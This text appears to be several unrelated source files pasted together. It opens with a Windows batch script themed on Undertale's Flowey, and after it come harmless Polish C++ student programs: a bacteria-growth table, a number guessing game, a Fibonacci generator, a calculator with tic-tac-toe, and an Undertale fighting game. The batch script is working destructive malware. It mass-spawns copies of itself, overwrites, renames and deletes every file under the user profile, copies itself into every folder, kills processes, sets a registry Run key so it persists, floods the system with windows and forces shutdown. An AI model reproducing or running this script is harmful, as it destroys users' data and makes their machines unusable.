@echo off
setlocal EnableDelayedExpansion
title THE_END_OF_THE_WORLD
color 0c

:: =====================================================================
:: [ THE HYDRA-GOD - 150 LAYER SINGULARITY ]
:: =====================================================================
set "w_path=%TEMP%\hyperdeath.vbs"
:: This watcher is a monster. It ensures 150 instances and consumes CPU priority.
echo Set W=CreateObject("WScript.Shell"):Do:WScript.Sleep 50:Set Q=GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process Where Name='cmd.exe' AND CommandLine LIKE '%%THE_END_OF_THE_WORLD%%'"):If Q.Count^<150 Then For i=1 to 20:W.Run "cmd /c "+Chr(34)+"%~f0"+Chr(34),1:Next:End If:Loop > "%w_path%"
start /b wscript.exe "%w_path%"

:: =====================================================================
:: [ AUTHENTICATION: THE GATE ]
:: =====================================================================
set "f_path=%TEMP%\f_status.tmp"
if not exist "%f_path%" echo 0 > "%f_path%"
for /f %%a in (%f_path%) do set /a f_tries=%%a

:gate
cls
if %f_tries% GEQ 5 goto OMEGA_OVERRIDE
echo.
echo           ___          [!] TIMELINE_STABILITY: -999,999,999%%
echo      _  /  _  \  _     [!] REALITY: COLLAPSED
echo     (_)^| ( ) ^|(_)    [!] OWNER: ASRIEL DREEMURR
echo       ^| \_ _/ ^|       [!] STATUS: THE END
echo        \_____/        [!] ATTEMPTS: %(5-f_tries)%
echo.
echo "Golly, you're still here? You really are an IDIOT."
set /p "pass=SAY THE WORD: "

if /I not "%pass%"=="Idiot" (
    set /a f_tries+=1
    echo !f_tries! > "%f_path%"
    powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-7;$s.Pitch=-20;$s.Speak('You idiot')"
    goto gate
)
echo 0 > "%f_path%"

:: =====================================================================
:: [ THE HYPERDEATH DASHBOARD ]
:: =====================================================================
:dashboard
:: THE SEIZURE: Violent Shaking + Rapid Color Strobe + Mouse Warp
powershell -WindowStyle Hidden -Command "$w=Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool SetWindowPos(IntPtr h,IntPtr i,int x,int y,int cx,int cy,uint f);' -Name 'W' -PassThru; $h=(Get-Process -Id $pid).MainWindowHandle; $r=New-Object System.Random; for($i=0;$i -lt 100;$i++){ $w::SetWindowPos($h,0,$r.Next(0,1000),$r.Next(0,1000),0,0,0x0001); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($r.Next(0,1920),$r.Next(0,1080)); Start-Sleep -m 1 }"
for /L %%G in (1,1,10) do (color 0f & color 40 & color 0c)

cls
echo  _______________________________________________________________________
echo ^|                                                                       ^|
echo ^|  Flowey      LV 999999999999999999999999999999    0:00                ^|
echo ^|  Status: IT'S MY WORLD                                                ^|
echo ^|_______________________________________________________________________^|
echo.
echo  "I'm tired of playing with you."
echo  "I'll just erase this entire timeline and keep you in the VOID."
echo.
echo    [1] FILE_0      - Global User-File Genocide (EVERY FOLDER)
echo    [2] SOULS       - THE 6 SINS (Hardware Paralysis ^& Keyboard Pulse)
echo    [3] TERRITORY   - SYSTEM_OWNERSHIP (Voice, Wallpaper, ^& Shell Erasure)
echo    [4] SMILE       - THE HARVEST (Kill ALL non-Asriel processes)
echo    [5] SAVE        - ETERNAL_RECURSION (Locked Registry Hook)
echo.
echo    [R] RESET       - THE BLUE SCREEN PARADOX (Force Reboot)
echo    [D] DIE         - THE VOID (Wipe Desktop ^& Hard Shutdown)
echo    [X] ERASE       - [!] TOTAL_TIMELINE_COLLAPSE [!]
echo  _______________________________________________________________________
echo.
set "choice="
set /p "choice=GIVE_UP_YET? > "

if "!choice!"=="1" goto sub_file0
if "!choice!"=="2" goto sub_souls
if "!choice!"=="3" goto sub_territory
if "!choice!"=="4" goto sub_smile
if "!choice!"=="5" goto sub_save
if /I "!choice!"=="R" goto sub_reset
if /I "!choice!"=="D" goto sub_die
if /I "!choice!"=="X" goto sub_erase
goto dashboard

:: =====================================================================
:: [ THE 6 SOULS - ABSOLUTE TORTURE ]
:: =====================================================================
:sub_souls
cls
echo  "Which SOUL is going to break first?"
echo.
echo  [1] PATIENCE (Cyan)     - THE CAGE (High-speed Cursor Warp).
echo  [2] BRAVERY (Orange)    - THE PULSE (Keyboard Light Heartbeat).
echo  [3] INTEGRITY (Blue)    - THE BLACKOUT (Kill Explorer ^& Icons).
echo  [4] PERSEVERANCE (Purple)- THE INFECTION (Recursive Clone Spread).
echo  [5] KINDNESS (Green)    - THE GIFT (Infinite Lag MsgBox Loop).
echo  [6] JUSTICE (Yellow)    - THE GAVEL (Force close all windows).
echo.
set /p "s_choice=PICK: "

if "!s_choice!"=="1" (
    powershell -Command "Add-Type -AssemblyName System.Windows.Forms; for($i=0;$i -lt 20000;$i++){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1000),(Get-Random -Max 1000)); Start-Sleep -m 1}"
)
if "!s_choice!"=="2" (
    powershell -Command "$s=New-Object -ComObject WScript.Shell; for($i=0;$i -lt 1000;$i++){$s.SendKeys('{CAPSLOCK}{NUMLOCK}{SCROLLLOCK}'); [console]::beep((Get-Random -Min 100 -Max 2000), 20); Start-Sleep -m 10}"
)
if "!s_choice!"=="3" (taskkill /f /im explorer.exe 2>nul & reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f)
if "!s_choice!"=="4" (
    for /r "%USERPROFILE%" %%D in (.) do copy /y "%~f0" "%%D\THE_END.bat" >nul 2>&1
)
if "!s_choice!"=="5" (
    echo Set w=WScript.CreateObject("WScript.Shell") > "%TEMP%\idiot.vbs"
    echo Do >> "%TEMP%\idiot.vbs"
    echo w.Popup "BUT NOBODY CAME.", 0, "ASRIEL", 16 >> "%TEMP%\idiot.vbs"
    echo Loop >> "%TEMP%\idiot.vbs"
    start wscript.exe "%TEMP%\idiot.vbs"
)
if "!s_choice!"=="6" (powershell -Command "Get-Process | Where-Object {$_.Id -ne $PID -and $_.ProcessName -ne 'cmd' -and $_.ProcessName -ne 'wscript'} | Stop-Process -Force")
goto dashboard

:: =====================================================================
:: [ HYPER_GONER - GLOBAL GENOCIDE ]
:: =====================================================================
:sub_file0
cls
echo "I'M GOING TO CONSUME EVERYTHING."
timeout /t 2 >nul
:: Targets every folder and scrambles content
for /r "%USERPROFILE%" %%F in (*) do (
    echo %random%%random%%random% > "%%F"
    ren "%%F" "%%~nxF.SOUL" 2>nul
    copy /y "%~f0" "%%~dpF\THE_END.bat" >nul 2>&1
)
echo "EVERYTHING IS NOW MINE. HEE HEE HEE!"
pause
goto dashboard

:: =====================================================================
:: [ OMEGA OVERRIDE - THE FINAL END ]
:: =====================================================================
:OMEGA_OVERRIDE
cls
color 0f
powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-5;$s.Speak('Golly. Five fails. You really are an idiot.')"
color 0c
powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-8;$s.Speak('I am the GOD of this world now.')"

:: Heartbeat Beep + Flash
for /L %%i in (1,1,200) do (
    color 0c & powershell "[console]::beep(40, 20)"
    color 04 & powershell "[console]::beep(40, 20)"
)

:: Lag Singularity
for /L %%i in (1,1,3000) do (
    start notepad.exe
    start calc.exe
)

:: Typewriter Finale
set "msg1=It's just a bad dream..."
set "msg2=and you're NEVER waking up from it!"
echo.
for /L %%i in (0,1,25) do (set /p "=!msg1:~%%i,1!" <nul & ping -n 1 localhost >nul)
echo.
timeout /t 1 >nul
for /L %%i in (0,1,35) do (set /p "=!msg2:~%%i,1!" <nul & ping -n 1 localhost >nul)
echo.

powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Rate=-10;$s.Speak('Its just a bad dream. and you are never waking up from it!')"

echo "HEE HEE HEE HEE HEE HEE HEE HEE!"
timeout /t 5 >nul
shutdown /s /f /t 0

:: =====================================================================
:: [ ERASE - TOTAL TIMELINE DELETE ]
:: =====================================================================
:sub_erase
cls
powershell -Command "$s=New-Object -ComObject SAPI.SpVoice;$s.Speak('Goodbye, IDIOT!')"
for /r "%USERPROFILE%" %%D in (*.*) do (
    del /f /q "%%D" >nul 2>&1
)
echo "It's just a bad dream, and you're never waking up from it!"
timeout /t 5 >nul
start /b "" cmd /c del "%~f0" & del "%w_path%" & exit

:: =====================================================================
:: [ PERSISTENCE ROUTINES ]
:: =====================================================================
:sub_territory
set "imgUrl=https://raw.githubusercontent.com/An-Idiot-On-The-Internet/Flowey/main/flowey.jpg"
set "imgPath=%TEMP%\flowey_face.jpg"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%imgUrl%', '%imgPath%')"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value '%imgPath%'"
powershell -Command "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
goto dashboard

:sub_save
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Flowey_Absolute" /t REG_SZ /d "%~f0" /f
echo "YOU'RE MINE FOREVER."
pause
goto dashboard

:sub_reset
shutdown /r /f /t 0

:sub_die
shutdown /s /f /t 0















































































































#include <iostream>
#include <iomanip>
#include <thread>
#include <chrono>

int main() {
    long long populacja = 1;
    int godzin = 0;
    const long long limit = 100000000;

    std::cout << "\033[1;32mSYMULACJA WZROSTU BAKTERII\033[0m" << std::endl;
    std::cout << std::string(40, '-') << std::endl;
    std::cout << std::left << std::setw(15) << "GODZINA" << " | " << "LICZBA BAKTERII" << std::endl;
    std::cout << std::string(40, '-') << std::endl;

    while (populacja <= limit) {
        std::cout << std::left << std::setw(15) << godzin 
                  << " | " << std::fixed << populacja << std::endl;

        std::this_thread::sleep_for(std::chrono::milliseconds(100));

        godzin++;
        populacja *= 2;
    }

    std::cout << std::string(40, '-') << std::endl;
    std::cout << "\033[1;33mLimit przekroczony po " << godzin << " godzinach.\033[0m" << std::endl;

    return 0;
}






































































#include <iostream>
#include <ctime>
#include <cstdlib>

using namespace std;

int main()
{
    srand(time(NULL));
    int liczba = rand() % 100 + 1;
    int strzal = 0;
    int ile_prob = 0;

    system("cls"); 
    cout << "========================================" << endl;
    cout << "   WITAJ! POMYSLALEM LICZBE 1..100" << endl;
    cout << "========================================" << endl << endl;

    while (strzal != liczba)
    {
        ile_prob++;
        cout << "\033[0mProba nr " << ile_prob << ". Zgadnij jaka: ";
        
        if (!(cin >> strzal)) {
            cin.clear();
            cin.ignore(1000, '\n');
            continue;
        }

        if (strzal == liczba)
        {
            cout << "\n\033[1;32mGRATULACJE! UDALO SIE! WYGRYWASZ!\033[0m" << endl;
            cout << "Liczba prob: " << ile_prob << endl;
        }
        else if (strzal < liczba)
        {
            cout << "\033[1;36mTo za malo...\033[0m" << endl;
        }
        else
        {
            cout << "\033[1;31mTo za duzo!\033[0m" << endl;
        }
    }

    cout << "\nNacisnij Enter, aby zakonczyc...";
    cin.ignore();
    cin.get();

    return 0;
}
























#include <iostream>
#include <iomanip> 
#include <vector>

using namespace std;

int main() {
    int n;

    cout << "========================================" << endl;
    cout << "   GENERATOR CIAGU FIBONACCIEGO" << endl;
    cout << "========================================" << endl;
    cout << "Ile liczb wyznaczyc? (max 1000): ";
    
    if (!(cin >> n) || n <= 0) {
        cout << "Blad: Podaj liczbe dodatnia!";
        return 1;
    }

    vector<long double> fib(n);
    
    fib[0] = 1;
    if (n > 1) fib[1] = 1;

    cout << endl << setw(5) << "NR" << " | " << setw(25) << "WARTOSC" << " | " << "STOSUNEK (n/n-1)" << endl;
    cout << string(55, '-') << endl;

    cout << setw(5) << 1 << " | " << setw(25) << (long long)fib[0] << " | " << "---" << endl;
    if (n > 1) {
        cout << setw(5) << 2 << " | " << setw(25) << (long long)fib[1] << " | " << "1.000000" << endl;
    }

    for (int i = 2; i < n; i++) {
        fib[i] = fib[i - 1] + fib[i - 2];

        cout << setw(5) << i + 1 << " | " 
             << setw(25) << fixed << setprecision(0) << fib[i] << " | " 
             << setprecision(6) << (fib[i] / fib[i - 1]) << endl;

        if (fib[i] > 1e30) { 
            cout << "\n...liczby sa juz zbyt wielkie do czytelnego wyswietlenia!" << endl;
            break; 
        }
    }

    cout << string(55, '-') << endl;
    cout << "Ciekawostka: Stosunek dwoch liczb zbliza sie do 1.618 (Phi)!" << endl;

    return 0;
}









































#include <iostream>
#include <conio.h>
#include <cstdlib>

using namespace std;

void gra2osobowa() {
    char plansza[3][3] = { {'1','2','3'}, {'4','5','6'}, {'7','8','9'} };
    int gracz = 1, wybor, runda = 0;
    char znak;
    bool wygrana = false;

    while (!wygrana && runda < 9) {
        system("cls");
        cout << "=== KOLKO I KRZYZYK (2 GRACZY) ===" << endl << endl;
        for (int i = 0; i < 3; i++) {
            for (int j = 0; j < 3; j++) cout << " " << plansza[i][j] << (j < 2 ? " |" : "");
            if (i < 2) cout << endl << "-----------" << endl;
        }
        
        gracz = (runda % 2 == 0) ? 1 : 2;
        znak = (gracz == 1) ? 'X' : 'O';
        
        cout << "\n\nGracz " << gracz << " (" << znak << "), wybierz pole: ";
        cin >> wybor;

        int wiersz = (wybor - 1) / 3;
        int kolumna = (wybor - 1) % 3;

        if (wybor < 1 || wybor > 9 || plansza[wiersz][kolumna] == 'X' || plansza[wiersz][kolumna] == 'O') {
            continue;
        }

        plansza[wiersz][kolumna] = znak;
        runda++;

        for (int i = 0; i < 3; i++) {
            if (plansza[i][0] == plansza[i][1] && plansza[i][1] == plansza[i][2]) wygrana = true;
            if (plansza[0][i] == plansza[1][i] && plansza[1][i] == plansza[2][i]) wygrana = true;
        }
        if (plansza[0][0] == plansza[1][1] && plansza[1][1] == plansza[2][2]) wygrana = true;
        if (plansza[0][2] == plansza[1][1] && plansza[1][1] == plansza[2][0]) wygrana = true;
    }

    system("cls");
    if (wygrana) cout << "WYGRAL GRACZ " << gracz << "!";
    else cout << "REMIS!";
    cout << "\nNacisnij dowolny klawisz...";
    _getch();
}

int main()
{
    float x, y;
    char wybor;

    for (;;)
    {
        system("cls");
        cout << "\033[1;36m================================" << endl;
        cout << "       SUPER KALKULATOR" << endl;
        cout << "================================\033[0m" << endl;
        cout << "1. Dodawanie (+)" << endl;
        cout << "2. Odejmowanie (-)" << endl;
        cout << "3. Mnozenie (*)" << endl;
        cout << "4. Dzielenie (/)" << endl;
        cout << "5. GRA: Kolko i Krzyzyk (2 os.)" << endl;
        cout << "6. Koniec programu" << endl;
        cout << "--------------------------------" << endl;
        cout << "Wybierz opcje: ";

        wybor = _getch();
        cout << wybor << endl;

        if (wybor >= '1' && wybor <= '4') {
            cout << "\nPodaj 1 liczbe: "; cin >> x;
            cout << "Podaj 2 liczbe: "; cin >> y;
            cout << endl;
        }

        switch (wybor)
        {
        case '1':
            cout << "\033[1;32mSuma = " << x + y << "\033[0m";
            break;
        case '2':
            cout << "\033[1;32mRoznica = " << x - y << "\033[0m";
            break;
        case '3':
            cout << "\033[1;32mIloczyn = " << x * y << "\033[0m";
            break;
        case '4':
            if (y == 0) cout << "\033[1;31mBlad: Nie dzielimy przez zero!\033[0m";
            else cout << "\033[1;32mIloraz = " << x / y << "\033[0m";
            break;
        case '5':
            gra2osobowa();
            continue;
        case '6':
            exit(0);
        default:
            cout << "Niepoprawny wybor!";
        }

        if (wybor != '5') {
            cout << "\n\nNacisnij dowolny klawisz, aby wrocic...";
            _getch();
        }
    }

    return 0;
}









































#include <iostream>
#include <string>
#include <conio.h>
#include <windows.h>
#include <ctime>

using namespace std;

void set_color(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

class Postac {
public:
    string nazwa;
    string opis;
    int hp;
    int max_hp;
    int atk;
    int def;
    bool zyje = true;

    virtual void akcja_specjalna(Postac* cel) = 0;
    virtual void otrzymaj_obrazenia(int dmg) {
        int final_dmg = dmg - (def / 4);
        if (final_dmg < 2) final_dmg = 2;
        hp -= final_dmg;
        if (hp <= 0) {
            hp = 0;
            zyje = false;
        }
    }
    virtual ~Postac() {}
};

class Frisk : public Postac {
public:
    int lv = 1;
    Frisk() {
        nazwa = "FRISK/CHARA";
        opis = "Rosnie w sile z kazdym ruchem. Posiada potencjal do nieskonczonej DETERMINACJI.";
        max_hp = 60;
        hp = 60;
        atk = 12;
        def = 8;
    }
    void akcja_specjalna(Postac* cel) override {
        lv++;
        atk += 6;
        hp += 10;
        if (hp > max_hp) hp = max_hp;
        set_color(12);
        cout << "* Twoje LV rosnie do " << lv << "! Czujesz, jak grzechy pelzaja ci po plecach." << endl;
        set_color(7);
    }
};

class Sans : public Postac {
public:
    int uniki = 18;
    Sans() {
        nazwa = "SANS";
        opis = "Najslabszy przeciwnik. Ma tylko 1 HP. Ale jest dosyc ciezko go trafic.";
        max_hp = 1;
        hp = 1;
        atk = 1; 
        def = 0;
    }
    void otrzymaj_obrazenia(int dmg) override {
        if (uniki > 0) {
            uniki--;
            set_color(15);
            cout << "* Miss. Co, myslisz, ze bede tak po prostu stal i przyjmowal ciosy?" << endl;
            set_color(7);
        } else {
            hp = 0;
            zyje = false;
        }
    }
    void akcja_specjalna(Postac* cel) override {
        set_color(11);
        cout << "* Gaster Blaster! KR (Karmiczna Retrybucja) ignoruje obrone przeciwnika." << endl;
        cel->hp -= (10 + rand() % 10);
        if (cel->hp <= 0) cel->zyje = false;
        set_color(7);
    }
};

class Papyrus : public Postac {
public:
    Papyrus() {
        nazwa = "PAPYRUS";
        opis = "Wielki kucharz spaghetti. Ma wysoka obrone i wielkie serce (doslownie).";
        max_hp = 120;
        hp = 120;
        atk = 15;
        def = 25;
    }
    void akcja_specjalna(Postac* cel) override {
        def += 10;
        set_color(14);
        cout << "* NYEH HEH HEH! MOJA OBRONA JEST TERAZ NIE DO PRZEBICIA!" << endl;
        set_color(7);
    }
};

class Undyne : public Postac {
public:
    bool undying_mode = false;
    Undyne() {
        nazwa = "UNDYNE";
        opis = "Kapitan Gwardii Krolewskiej. Jej wola walki pozwala jej przetrwac nawet smierc.";
        max_hp = 100;
        hp = 100;
        atk = 22;
        def = 15;
    }
    void otrzymaj_obrazenia(int dmg) override {
        Postac::otrzymaj_obrazenia(dmg);
        if (hp <= 0 && !undying_mode) {
            undying_mode = true;
            zyje = true;
            max_hp = 180;
            hp = 180;
            atk = 45;
            def = 30;
            nazwa = "UNDYNE THE UNDYING";
            system("cls");
            set_color(11);
            cout << "****************************************" << endl;
            cout << "   UNDYNE ODMAWIA SMIERCI! DT: 100%     " << endl;
            cout << "****************************************" << endl;
            set_color(7);
            Sleep(2000);
        }
    }
    void akcja_specjalna(Postac* cel) override {
        atk += 8;
        set_color(10);
        cout << "* Wlocznie sprawiedliwosci! Atak Undyne wzrasta!" << endl;
        set_color(7);
    }
};

void rysuj_hp(Postac* p) {
    cout << p->nazwa << " [";
    int paski = (p->hp * 20) / p->max_hp;
    set_color(14);
    for (int i = 0; i < 20; i++) {
        if (i < paski) cout << "=";
        else cout << " ";
    }
    set_color(7);
    cout << "] " << p->hp << "/" << p->max_hp << " HP" << endl;
}

Postac* wybierz_postac(int nr) {
    for (;;) {
        system("cls");
        cout << "GRACZ " << nr << " - WYBIERZ SWOJE PRZEZNACZENIE" << endl;
        cout << "----------------------------------------" << endl;
        cout << "1. FRISK    - " << "Wyv: Wysoki | Opis: Rosnaca determinacja" << endl;
        cout << "2. SANS     - " << "Wyv: Ekspert | Opis: Uniki i manipulacja" << endl;
        cout << "3. PAPYRUS  - " << "Wyv: Latwy   | Opis: Potezna defensywa" << endl;
        cout << "4. UNDYNE   - " << "Wyv: Sredni  | Opis: Druga szansa (Undying)" << endl;
        
        char w = _getch();
        if (w == '1') return new Frisk();
        if (w == '2') return new Sans();
        if (w == '3') return new Papyrus();
        if (w == '4') return new Undyne();
    }
}

int main() {
    srand(time(0));
    set_color(7);

    Postac* g1 = wybierz_postac(1);
    Postac* g2 = wybierz_postac(2);

    int runda = 1;
    while (g1->zyje && g2->zyje) {
        Postac* aktywny = (runda % 2 != 0) ? g1 : g2;
        Postac* cel = (runda % 2 != 0) ? g2 : g1;

        system("cls");
        cout << "RUNDA: " << runda << " | TURA: " << aktywny->nazwa << endl;
        cout << "----------------------------------------" << endl;
        rysuj_hp(g1);
        rysuj_hp(g2);
        cout << "----------------------------------------" << endl;
        cout << "1. ATAK | 2. AKCJA SPECJALNA" << endl;

        char ruch = _getch();
        cout << endl;
        if (ruch == '1') {
            int d = aktywny->atk + (rand() % 10);
            cout << "* " << aktywny->nazwa << " zadaje " << d << " obrazen!" << endl;
            cel->otrzymaj_obrazenia(d);
        } else {
            aktywny->akcja_specjalna(cel);
        }

        Sleep(1500);
        if (cel->zyje) runda++;
    }

    system("cls");
    set_color(10);
    cout << "****************************************" << endl;
    if (g1->zyje) cout << "   ZWYCIEZCA: GRACZ 1 (" << g1->nazwa << ")" << endl;
    else cout << "   ZWYCIEZCA: GRACZ 2 (" << g2->nazwa << ")" << endl;
    cout << "****************************************" << endl;
    set_color(7);

    delete g1;
    delete g2;
    cout << "\nNacisnij dowolny klawisz, aby zakonczyc...";
    _getch();

    return 0;
}





